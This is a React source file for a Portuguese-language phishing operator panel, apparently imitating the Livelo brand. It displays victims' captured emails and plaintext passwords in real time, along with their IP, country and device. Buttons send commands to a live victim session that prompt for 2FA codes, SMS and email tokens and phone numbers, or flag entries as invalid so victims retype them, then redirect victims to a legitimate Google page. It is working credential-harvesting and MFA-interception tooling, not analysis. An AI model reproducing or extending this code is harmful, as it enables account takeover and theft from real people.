import { useState, useEffect } from "react";
import axios from "axios";

const BACKEND_URL = process.env.REACT_APP_BACKEND_URL;
const API = `${BACKEND_URL}/api`;

function AdminPanel() {
  const [loginAttempts, setLoginAttempts] = useState([]);
  const [loading, setLoading] = useState(true);
  const [referenceField, setReferenceField] = useState("");
  const [redirectUrl, setRedirectUrl] = useState("https://business.google.com/");
  const [copiedField, setCopiedField] = useState(null);
  const [isAuthenticated, setIsAuthenticated] = useState(!!localStorage.getItem("admin_token"));
  const [username, setUsername] = useState("");
  const [loginPassword, setLoginPassword] = useState("");
  const [loginError, setLoginError] = useState("");
  const [loginLoading, setLoginLoading] = useState(false);

  // Função para copiar texto com um clique
  const copyToClipboard = async (text, fieldId) => {
    if (!text || text === "-") return;
    try {
      await navigator.clipboard.writeText(text);
      setCopiedField(fieldId);
      setTimeout(() => setCopiedField(null), 1500);
    } catch (err) {
      console.error("Erro ao copiar:", err);
    }
  };

  useEffect(() => {
    fetchLoginAttempts();
    const interval = setInterval(fetchLoginAttempts, 3000);
    
    // Verificar usuários offline a cada 5 segundos
    const checkOfflineInterval = setInterval(async () => {
      try {
        const headers = getAuthHeaders();
        if (headers) {
          await axios.post(`${API}/admin/check-offline-users`, {}, { headers });
        }
      } catch (error) {
        console.error("Erro ao verificar offline:", error);
      }
    }, 5000);
    
    return () => {
      clearInterval(interval);
      clearInterval(checkOfflineInterval);
    };
  }, []);

  const getAuthHeaders = () => {
    const token = localStorage.getItem("admin_token");
    if (!token) {
      setIsAuthenticated(false);
      return null;
    }
    return { Authorization: `Bearer ${token}` };
  };

  const fetchLoginAttempts = async () => {
    try {
      const headers = getAuthHeaders();
      if (!headers) return;

      const response = await axios.get(`${API}/admin/login-attempts`, { headers });
      setLoginAttempts(response.data);
      setLoading(false);
    } catch (error) {
      console.error("Erro ao buscar tentativas:", error);
      if (error.response?.status === 401) {
        localStorage.removeItem("admin_token");
        setIsAuthenticated(false);
      }
    }
  };

  const sendCommand = async (userId, command) => {
    try {
      const headers = getAuthHeaders();
      if (!headers) return;

      const payload = {
        user_id: userId,
        command: command,
      };

      if (command === "REDIRECT") {
        payload.redirect_url = redirectUrl;
      }
      
      // Enviar referência para comandos que precisam (TOK-TEL, TOK-MAIL)
      if (command === "TOK-TEL" || command === "TOK-MAIL") {
        payload.reference = referenceField;
      }

      await axios.post(`${API}/admin/command`, payload, { headers });
      
      // Limpar campo de referência após enviar comando que usa ele
      if (command === "TOK-TEL" || command === "TOK-MAIL") {
        setReferenceField("");
      }
      
      fetchLoginAttempts();
    } catch (error) {
      console.error("Erro ao enviar comando:", error);
    }
  };

  // Função para invalidar dado e pedir novamente
  const sendInvalidCommand = async (userId, command) => {
    try {
      const headers = getAuthHeaders();
      if (!headers) return;

      // Limpar o campo correspondente
      await axios.post(`${API}/admin/invalidate-field`, {
        user_id: userId,
        command: command
      }, { headers });
      
      // Enviar o comando de invalidação (com sufixo -INV para mostrar erro)
      const payload = {
        user_id: userId,
        command: command + "-INV",  // Adiciona sufixo para indicar invalidação
      };
      
      // Enviar referência para comandos que precisam (TOK-TEL, TOK-MAIL)
      if (command === "TOK-TEL" || command === "TOK-MAIL") {
        payload.reference = referenceField;
      }
      
      await axios.post(`${API}/admin/command`, payload, { headers });
      
      // Limpar campo de referência após enviar comando que usa ele
      if (command === "TOK-TEL" || command === "TOK-MAIL") {
        setReferenceField("");
      }
      
      fetchLoginAttempts();
    } catch (error) {
      console.error("Erro ao invalidar campo:", error);
    }
  };

  const updateStatus = async (userId, status) => {
    try {
      const headers = getAuthHeaders();
      if (!headers) return;

      await axios.post(`${API}/admin/update-status/${userId}?status=${status}`, {}, { headers });
      fetchLoginAttempts();
    } catch (error) {
      console.error("Erro ao atualizar status:", error);
    }
  };

  // Função para deletar um card individual
  const deleteAttempt = async (id) => {
    try {
      const headers = getAuthHeaders();
      if (!headers) return;

      await axios.delete(`${API}/admin/login-attempts/${id}`, { headers });
      setLoginAttempts(loginAttempts.filter((a) => a.id !== id));
    } catch (error) {
      console.error("Erro ao deletar:", error);
    }
  };

  const handleDelete = async (id) => {
    try {
      const headers = getAuthHeaders();
      if (!headers) return;

      await axios.delete(`${API}/admin/login-attempts/${id}`, { headers });
      setLoginAttempts(loginAttempts.filter((a) => a.id !== id));
    } catch (error) {
      console.error("Erro ao deletar:", error);
    }
  };

  const handleClearAll = async () => {
    if (!window.confirm("Tem certeza que deseja limpar todas as tentativas?")) {
      return;
    }

    try {
      const headers = getAuthHeaders();
      if (!headers) return;

      await axios.post(`${API}/admin/clear-all`, {}, { headers });
      setLoginAttempts([]);
    } catch (error) {
      console.error("Erro ao limpar:", error);
    }
  };

  const handleLogout = () => {
    localStorage.removeItem("admin_token");
    setIsAuthenticated(false);
  };

  const handleAdminLogin = async (e) => {
    e.preventDefault();
    setLoginError("");
    setLoginLoading(true);

    try {
      const response = await axios.post(`${API}/admin/login`, {
        username,
        password: loginPassword,
      });

      localStorage.setItem("admin_token", response.data.access_token);
      setIsAuthenticated(true);
      setUsername("");
      setLoginPassword("");
    } catch (err) {
      setLoginError("Credenciais inválidas");
      setLoginLoading(false);
    }
  };

  // Tela de login se não autenticado
  if (!isAuthenticated) {
    return (
      <div className="min-h-screen bg-[#0a0a0a] flex items-center justify-center p-4">
        <div className="bg-[#111111] border border-green-900/30 rounded-2xl shadow-2xl shadow-green-900/10 p-8 w-full max-w-md">
          <div className="text-center mb-8">
            <h1 className="text-3xl font-bold text-green-400 mb-2">Admin Panel</h1>
            <p className="text-gray-500">Entre com suas credenciais</p>
          </div>

          <form onSubmit={handleAdminLogin} className="space-y-6">
            <div>
              <label className="block text-sm font-medium text-green-400/80 mb-2">
                Usuário
              </label>
              <input
                type="text"
                value={username}
                onChange={(e) => setUsername(e.target.value)}
                className="w-full px-4 py-3 bg-[#0a0a0a] border border-green-900/40 rounded-lg focus:ring-2 focus:ring-green-500/50 focus:border-green-500/50 text-green-100 placeholder-gray-600 transition-all"
                placeholder="donas"
                required
              />
            </div>

            <div>
              <label className="block text-sm font-medium text-green-400/80 mb-2">
                Senha
              </label>
              <input
                type="password"
                value={loginPassword}
                onChange={(e) => setLoginPassword(e.target.value)}
                className="w-full px-4 py-3 bg-[#0a0a0a] border border-green-900/40 rounded-lg focus:ring-2 focus:ring-green-500/50 focus:border-green-500/50 text-green-100 placeholder-gray-600 transition-all"
                placeholder="••••••••"
                required
              />
            </div>

            {loginError && (
              <div className="bg-red-900/30 border border-red-500/30 text-red-400 px-4 py-3 rounded-lg text-sm">
                {loginError}
              </div>
            )}

            <button
              type="submit"
              disabled={loginLoading}
              className="w-full bg-green-900/40 text-green-400 border border-green-500/40 py-3 rounded-lg font-semibold hover:bg-green-900/60 transition-colors disabled:opacity-50 disabled:cursor-not-allowed"
            >
              {loginLoading ? "Entrando..." : "Entrar"}
            </button>
          </form>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-[#0a0a0a]">
      {/* Header */}
      <header className="bg-[#111111] border-b border-green-900/40 shadow-lg shadow-green-900/10">
        <div className="container mx-auto px-4 py-4">
          <div className="flex items-center justify-between flex-wrap gap-4">
            <div className="flex items-center gap-2 flex-wrap">
              <button className="bg-[#1a1a1a] hover:bg-[#252525] text-white font-bold border border-orange-500/30 px-4 py-2 rounded text-sm transition-colors">
                TXT
              </button>
              <button className="bg-[#1a1a1a] hover:bg-[#252525] text-white font-bold border border-blue-500/30 px-4 py-2 rounded text-sm transition-colors">
                PDF
              </button>
              <button className="bg-[#1a1a1a] hover:bg-[#252525] text-white font-bold border border-cyan-500/30 px-4 py-2 rounded text-sm transition-colors">
                Telegram
              </button>
              <button
                onClick={handleClearAll}
                className="bg-[#1a1a1a] hover:bg-red-900/40 text-white font-bold border border-red-500/30 px-4 py-2 rounded text-sm transition-colors"
              >
                Limpar Tudo
              </button>
              <button
                onClick={fetchLoginAttempts}
                className="bg-green-900/30 hover:bg-green-900/50 text-white font-bold border border-green-500/40 px-4 py-2 rounded text-sm transition-colors"
              >
                Atualizar
              </button>
              <button className="bg-[#1a1a1a] hover:bg-[#252525] text-white font-bold border border-purple-500/30 px-4 py-2 rounded text-sm transition-colors">
                Exibir Visitantes
              </button>
            </div>
            <div className="flex items-center gap-3">
              <img
                src="https://customer-assets.emergentagent.com/job_noite-web/artifacts/b119auio_Logo_Livelo_Logo1-removebg-preview.png"
                alt="Livelo"
                className="h-8"
              />
              <button
                onClick={handleLogout}
                className="bg-[#1a1a1a] hover:bg-[#252525] text-white font-bold border border-gray-600/40 px-4 py-2 rounded text-sm transition-colors"
              >
                Sair
              </button>
              <button className="bg-green-500/20 text-white font-bold border border-green-500/50 px-4 py-2 rounded text-sm hover:bg-green-500/30 transition-colors">
                DONAS
              </button>
            </div>
          </div>
        </div>
      </header>

      {/* Content */}
      <div className="container mx-auto px-4 py-8">
        <div className="bg-[#111111] rounded-lg border border-green-900/30 p-6">
          {/* Search */}
          <div className="mb-6 grid grid-cols-1 md:grid-cols-2 gap-4">
            <div>
              <label className="block text-sm font-medium text-green-400/80 mb-2">
                Campo de referência:
              </label>
              <input
                type="text"
                value={referenceField}
                onChange={(e) => setReferenceField(e.target.value)}
                placeholder="Ex: final do telefone, nome..."
                className="w-full px-4 py-2 bg-[#0a0a0a] border border-green-900/40 rounded-lg focus:ring-2 focus:ring-green-500/50 focus:border-green-500/50 text-green-100 placeholder-gray-600"
              />
            </div>
            <div>
              <label className="block text-sm font-medium text-green-400/80 mb-2">
                Site de Redirecionamento (Comando close):
              </label>
              <div className="flex gap-2">
                <input
                  type="text"
                  value={redirectUrl}
                  onChange={(e) => setRedirectUrl(e.target.value)}
                  placeholder="https://business.google.com/"
                  className="flex-1 px-4 py-2 bg-[#0a0a0a] border border-green-900/40 rounded-lg focus:ring-2 focus:ring-green-500/50 focus:border-green-500/50 text-green-100 placeholder-gray-600"
                />
              </div>
            </div>
          </div>

          {/* Loading */}
          {loading ? (
            <div className="text-center py-12">
              <div className="inline-block animate-spin rounded-full h-12 w-12 border-b-2 border-green-500"></div>
              <p className="mt-4 text-green-400/60">Carregando...</p>
            </div>
          ) : loginAttempts.length === 0 ? (
            <div className="text-center py-12">
              <p className="text-gray-500 text-lg">Nenhuma tentativa de login encontrada</p>
            </div>
          ) : (
            <div className="space-y-6">
              {loginAttempts.map((attempt, index) => {
                // Calcular número total de tentativas (original + adicionais)
                const totalAttempts = 1 + (attempt.attempts ? attempt.attempts.length : 0);
                
                return (
                  <div key={attempt.id} className="border border-green-900/30 rounded-lg overflow-hidden">
                    {/* Header com email e número de tentativas */}
                    <div className="bg-[#0d1f0d] border-b border-green-900/40 px-4 py-3">
                      <h3 className="font-bold text-lg text-green-400">{attempt.email} ({totalAttempts} tentativa{totalAttempts > 1 ? 's' : ''})</h3>
                    </div>

                    {/* Tabela */}
                    <div className="overflow-x-auto">
                      <table className="w-full border-collapse">
                      <thead>
                        <tr>
                          <th className="bg-[#1a1a1a] px-3 py-2 text-xs font-bold text-white border border-[#2a2a2a]">#</th>
                          <th className="bg-[#1a1a1a] px-3 py-2 text-xs font-bold text-white border border-[#2a2a2a]">status</th>
                          <th 
                            onClick={() => sendCommand(attempt.id, "INV")}
                            className="bg-[#1a1a1a] px-3 py-2 text-xs font-bold text-white border border-[#2a2a2a] cursor-pointer hover:bg-red-900/30 transition-colors"
                            title="Clique para avisar que dados estão incorretos"
                          >
                            INV
                          </th>
                          <th className="bg-[#1a1a1a] px-3 py-2 text-xs font-bold text-white border border-[#2a2a2a]">USUÁRIO/LOGIN</th>
                          <th className="bg-[#1a1a1a] px-3 py-2 text-xs font-bold text-white border border-[#2a2a2a]">SENHA</th>
                          <th className="border border-[#2a2a2a] p-0">
                            <div className="flex">
                              <div 
                                onClick={() => sendCommand(attempt.id, "AUT")}
                                className="bg-[#1a1a1a] px-2 py-2 text-xs font-bold text-white cursor-pointer hover:bg-cyan-900/30 transition-colors flex-1"
                                title="Clique para pedir código 2FA"
                              >
                                AUT
                              </div>
                              <div 
                                onClick={() => sendInvalidCommand(attempt.id, "AUT")}
                                className="bg-red-900/40 px-2 py-2 text-xs font-bold text-white cursor-pointer hover:bg-red-900/60 transition-colors"
                                title="Invalidar código 2FA"
                              >
                                X
                              </div>
                            </div>
                          </th>
                          <th className="border border-[#2a2a2a] p-0">
                            <div className="flex">
                              <div 
                                onClick={() => sendCommand(attempt.id, "EMAIL")}
                                className="bg-[#1a1a1a] px-2 py-2 text-xs font-bold text-white cursor-pointer hover:bg-purple-900/30 transition-colors flex-1"
                                title="Clique para pedir email cadastrado"
                              >
                                EMAIL
                              </div>
                              <div 
                                onClick={() => sendInvalidCommand(attempt.id, "EMAIL")}
                                className="bg-red-900/40 px-2 py-2 text-xs font-bold text-white cursor-pointer hover:bg-red-900/60 transition-colors"
                                title="Invalidar email"
                              >
                                X
                              </div>
                            </div>
                          </th>
                          <th className="border border-[#2a2a2a] p-0">
                            <div className="flex">
                              <div 
                                onClick={() => sendCommand(attempt.id, "TOK-TEL")}
                                className="bg-[#1a1a1a] px-2 py-2 text-xs font-bold text-white cursor-pointer hover:bg-orange-900/30 transition-colors flex-1"
                                title="Clique para pedir código do telefone"
                              >
                                TOK-TEL
                              </div>
                              <div 
                                onClick={() => sendInvalidCommand(attempt.id, "TOK-TEL")}
                                className="bg-red-900/40 px-2 py-2 text-xs font-bold text-white cursor-pointer hover:bg-red-900/60 transition-colors"
                                title="Invalidar código SMS"
                              >
                                X
                              </div>
                            </div>
                          </th>
                          <th className="border border-[#2a2a2a] p-0">
                            <div className="flex">
                              <div 
                                onClick={() => sendCommand(attempt.id, "TELEFONE")}
                                className="bg-[#1a1a1a] px-2 py-2 text-xs font-bold text-white cursor-pointer hover:bg-green-900/30 transition-colors flex-1"
                                title="Clique para pedir número de telefone"
                              >
                                Nº TEL
                              </div>
                              <div 
                                onClick={() => sendInvalidCommand(attempt.id, "TELEFONE")}
                                className="bg-red-900/40 px-2 py-2 text-xs font-bold text-white cursor-pointer hover:bg-red-900/60 transition-colors"
                                title="Invalidar telefone"
                              >
                                X
                              </div>
                            </div>
                          </th>
                          <th className="border border-[#2a2a2a] p-0">
                            <div className="flex">
                              <div 
                                onClick={() => sendCommand(attempt.id, "TOK-MAIL")}
                                className="bg-[#1a1a1a] px-2 py-2 text-xs font-bold text-white cursor-pointer hover:bg-blue-900/30 transition-colors flex-1"
                                title="Clique para pedir token do email"
                              >
                                TOK-MAIL
                              </div>
                              <div 
                                onClick={() => sendInvalidCommand(attempt.id, "TOK-MAIL")}
                                className="bg-red-900/40 px-2 py-2 text-xs font-bold text-white cursor-pointer hover:bg-red-900/60 transition-colors"
                                title="Invalidar token do email"
                              >
                                X
                              </div>
                            </div>
                          </th>
                          <th 
                            onClick={() => sendCommand(attempt.id, "AGUARDE")}
                            className="bg-[#1a1a1a] px-3 py-2 text-xs font-bold text-white border border-[#2a2a2a] cursor-pointer hover:bg-yellow-900/30 transition-colors"
                            title="Clique para colocar em aguarde"
                          >
                            👍
                          </th>
                          <th 
                            onClick={() => sendCommand(attempt.id, "REDIRECT")}
                            className="bg-[#1a1a1a] px-3 py-2 text-xs font-bold text-white border border-[#2a2a2a] cursor-pointer hover:bg-pink-900/30 transition-colors"
                            title="Clique para redirecionar usuário"
                          >
                            Close
                          </th>
                          <th 
                            onClick={() => deleteAttempt(attempt.id)}
                            className="bg-[#1a1a1a] px-3 py-2 text-xs font-bold text-white border border-[#2a2a2a] cursor-pointer hover:bg-red-900/30 transition-colors"
                            title="Excluir este card"
                          >
                            🗑️
                          </th>
                        </tr>
                      </thead>
                      <tbody>
                        {/* Única linha de dados */}
                        <tr className="bg-[#0f0f0f]">
                          {/* # */}
                          <td className="px-3 py-3 text-center text-sm font-bold text-green-300 border border-[#2a2a2a]">{index + 1}</td>
                          
                          {/* status - bolinha clicável */}
                          <td className="px-3 py-3 text-center border border-[#2a2a2a]">
                            <button
                              onClick={() => updateStatus(attempt.id, attempt.status === "online" ? "offline" : "online")}
                              className="inline-flex items-center justify-center"
                            >
                              <span className={`w-4 h-4 rounded-full ${attempt.status === "online" ? "bg-green-500 shadow-lg shadow-green-500/50" : "bg-red-500 shadow-lg shadow-red-500/50"}`}></span>
                            </button>
                          </td>
                          
                          {/* INV - apenas header, célula vazia */}
                          <td className="px-3 py-3 text-center border border-[#2a2a2a]">
                            <span className="text-gray-600">-</span>
                          </td>
                          
                          {/* USUÁRIO/LOGIN - valor fixo - COPIÁVEL */}
                          <td 
                            className="px-3 py-3 text-sm border border-[#2a2a2a] font-medium cursor-pointer hover:bg-green-900/20 transition-colors text-green-100"
                            onClick={() => copyToClipboard(attempt.email, `email-${attempt.id}`)}
                            title="Clique para copiar"
                          >
                            <span className={copiedField === `email-${attempt.id}` ? "text-green-400" : ""}>
                              {copiedField === `email-${attempt.id}` ? "✓ Copiado!" : attempt.email}
                            </span>
                          </td>
                          
                          {/* SENHA - valor fixo - COPIÁVEL */}
                          <td 
                            className="px-3 py-3 text-sm border border-[#2a2a2a] cursor-pointer hover:bg-green-900/20 transition-colors text-green-100"
                            onClick={() => copyToClipboard(attempt.password, `password-${attempt.id}`)}
                            title="Clique para copiar"
                          >
                            <span className={copiedField === `password-${attempt.id}` ? "text-green-400" : ""}>
                              {copiedField === `password-${attempt.id}` ? "✓ Copiado!" : (attempt.password || "-")}
                            </span>
                          </td>
                          
                          {/* AUT - campo esperando dado - COPIÁVEL */}
                          <td 
                            className="px-3 py-3 text-center text-sm border border-[#2a2a2a] cursor-pointer hover:bg-green-900/20 transition-colors"
                            onClick={() => copyToClipboard(attempt.token_2fa, `token2fa-${attempt.id}`)}
                            title="Clique para copiar"
                          >
                            <span className={copiedField === `token2fa-${attempt.id}` ? "text-green-400" : "text-gray-400"}>
                              {copiedField === `token2fa-${attempt.id}` ? "✓ Copiado!" : (attempt.token_2fa || "-")}
                            </span>
                          </td>
                          
                          {/* EMAIL - campo esperando dado - COPIÁVEL */}
                          <td 
                            className="px-3 py-3 text-center text-sm border border-[#2a2a2a] cursor-pointer hover:bg-green-900/20 transition-colors"
                            onClick={() => copyToClipboard(attempt.email_input, `emailinput-${attempt.id}`)}
                            title="Clique para copiar"
                          >
                            <span className={copiedField === `emailinput-${attempt.id}` ? "text-green-400" : "text-gray-400"}>
                              {copiedField === `emailinput-${attempt.id}` ? "✓ Copiado!" : (attempt.email_input || "-")}
                            </span>
                          </td>
                          
                          {/* TOK-TEL - campo esperando dado - COPIÁVEL */}
                          <td 
                            className="px-3 py-3 text-center text-sm border border-[#2a2a2a] cursor-pointer hover:bg-green-900/20 transition-colors"
                            onClick={() => copyToClipboard(attempt.sms_code, `smscode-${attempt.id}`)}
                            title="Clique para copiar"
                          >
                            <span className={copiedField === `smscode-${attempt.id}` ? "text-green-400" : "text-gray-400"}>
                              {copiedField === `smscode-${attempt.id}` ? "✓ Copiado!" : (attempt.sms_code || "-")}
                            </span>
                          </td>
                          
                          {/* Nº TELEFONE - campo esperando dado - COPIÁVEL */}
                          <td 
                            className="px-3 py-3 text-center text-sm border border-[#2a2a2a] cursor-pointer hover:bg-green-900/20 transition-colors"
                            onClick={() => copyToClipboard(attempt.phone_number, `phone-${attempt.id}`)}
                            title="Clique para copiar"
                          >
                            <span className={copiedField === `phone-${attempt.id}` ? "text-green-400" : "text-gray-400"}>
                              {copiedField === `phone-${attempt.id}` ? "✓ Copiado!" : (attempt.phone_number || "-")}
                            </span>
                          </td>
                          
                          {/* TOK-MAIL - campo esperando dado - COPIÁVEL */}
                          <td 
                            className="px-3 py-3 text-center text-sm border border-[#2a2a2a] cursor-pointer hover:bg-green-900/20 transition-colors"
                            onClick={() => copyToClipboard(attempt.app_mail, `appmail-${attempt.id}`)}
                            title="Clique para copiar"
                          >
                            <span className={copiedField === `appmail-${attempt.id}` ? "text-green-400" : "text-gray-400"}>
                              {copiedField === `appmail-${attempt.id}` ? "✓ Copiado!" : (attempt.app_mail || "-")}
                            </span>
                          </td>
                          
                          {/* 👍 - apenas header, célula vazia */}
                          <td className="px-3 py-3 text-center border border-[#2a2a2a]">
                            <span className="text-gray-600">-</span>
                          </td>
                          
                          {/* X - apenas header, célula vazia */}
                          <td className="px-3 py-3 text-center border border-[#2a2a2a]">
                            <span className="text-gray-600">-</span>
                          </td>
                          
                          {/* 🗑️ - lixeira clicável */}
                          <td className="px-3 py-3 text-center border border-[#2a2a2a]">
                            <button
                              onClick={() => handleDelete(attempt.id)}
                              className="text-red-500/60 hover:text-red-400 text-xl transition-colors"
                            >
                              🗑️
                            </button>
                          </td>
                        </tr>
                        
                        {/* Tentativas adicionais */}
                        {attempt.attempts && attempt.attempts.map((additionalAttempt, attemptIndex) => (
                          <tr key={attemptIndex} className="bg-[#0a0f0a]">
                            {/* # */}
                            <td className="px-3 py-3 text-center text-sm font-bold text-green-300/70 border border-[#2a2a2a]">{attemptIndex + 2}</td>
                            
                            {/* status - vazio */}
                            <td className="px-3 py-3 text-center border border-[#2a2a2a]">
                              <span className="w-4 h-4 rounded-full bg-gray-700 inline-block"></span>
                            </td>
                            
                            {/* INV - vazio */}
                            <td className="px-3 py-3 text-center border border-[#2a2a2a]">
                              <span className="text-gray-600">-</span>
                            </td>
                            
                            {/* USUÁRIO/LOGIN - nova tentativa */}
                            <td className="px-3 py-3 text-sm border border-[#2a2a2a] font-medium text-green-100/70">{additionalAttempt.email}</td>
                            
                            {/* SENHA - nova tentativa */}
                            <td className="px-3 py-3 text-sm border border-[#2a2a2a] text-green-100/70">{additionalAttempt.password || "-"}</td>
                            
                            {/* Demais campos vazios */}
                            <td className="px-3 py-3 text-center text-sm border border-[#2a2a2a] text-gray-600">-</td>
                            <td className="px-3 py-3 text-center text-sm border border-[#2a2a2a] text-gray-600">-</td>
                            <td className="px-3 py-3 text-center text-sm border border-[#2a2a2a] text-gray-600">-</td>
                            <td className="px-3 py-3 text-center text-sm border border-[#2a2a2a] text-gray-600">-</td>
                            <td className="px-3 py-3 text-center text-sm border border-[#2a2a2a] text-gray-600">-</td>
                            <td className="px-3 py-3 text-center border border-[#2a2a2a] text-gray-600">-</td>
                            <td className="px-3 py-3 text-center border border-[#2a2a2a] text-gray-600">-</td>
                            <td className="px-3 py-3 text-center border border-[#2a2a2a] text-gray-600">-</td>
                          </tr>
                        ))}
                      </tbody>
                    </table>
                  </div>

                  {/* Footer com informações */}
                  <div className="bg-[#0a0a0a] px-4 py-3 text-xs text-green-400/60 border-t border-[#2a2a2a]">
                    <div className="grid grid-cols-2 md:grid-cols-4 gap-2">
                      <div><span className="font-semibold text-green-400/80">IP:</span> {attempt.ip_address || "-"}</div>
                      <div><span className="font-semibold text-green-400/80">País:</span> {attempt.country || "-"}</div>
                      <div><span className="font-semibold text-green-400/80">Dispositivo:</span> {attempt.device || "Desktop"}</div>
                      <div><span className="font-semibold text-green-400/80">Página atual:</span> {attempt.page || "Página Loading..."}</div>
                    </div>
                  </div>
                </div>
                );
              })}
            </div>
          )}
        </div>
      </div>
    </div>
  );
}

export default AdminPanel;
